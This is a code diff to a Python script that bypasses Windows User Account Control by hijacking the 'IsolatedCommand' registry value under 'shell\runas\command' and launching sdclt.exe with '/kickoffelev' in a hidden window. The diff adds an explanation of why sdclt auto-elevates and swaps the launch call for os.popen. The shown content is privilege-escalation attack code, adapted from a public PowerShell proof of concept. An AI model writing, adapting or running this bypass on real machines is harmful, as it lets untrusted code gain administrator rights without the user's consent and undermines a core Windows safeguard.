@@ -2,6 +2,10 @@
 https://github.com/enigma0x3/Misc-PowerShell-Stuff/blob/master/Invoke-SDCLTBypass.ps1
 
 Bypasses UAC by hijacking the "IsolatedCommand" value in "shell\runas\command"
+SDCLT is a Microsoft binary that is used in Windows systems (Windows 7 and above)
+to allow the user to perform backup and restore operations. However it is one of
+the Microsoft binaries that has been configured to have the autoElevate setting
+to true. 
 """
 import os
 import sys
@@ -13,7 +17,7 @@ import win32con
 def cmd_path():
 	path = "c:/windows/system32/cmd.exe"
 	
-	if os.path.isfile(os.path.join(path)) == True:
+	if (os.path.isfile(os.path.join(path)) == True):
 		return os.path.join(path)
 	else:
 		return False
@@ -37,7 +41,7 @@ def sdclt_bypass():
 				sys.exit()
 
 			try:
-				win32api.ShellExecute(0,None,"c:\windows\system32\sdclt.exe /kickoffelev",None,None,win32con.SW_HIDE)
+				sdclt_run = os.popen("c:\windows\system32\sdclt.exe /kickoffelev")
 			except Exception as error:
 				sys.exit()
 				
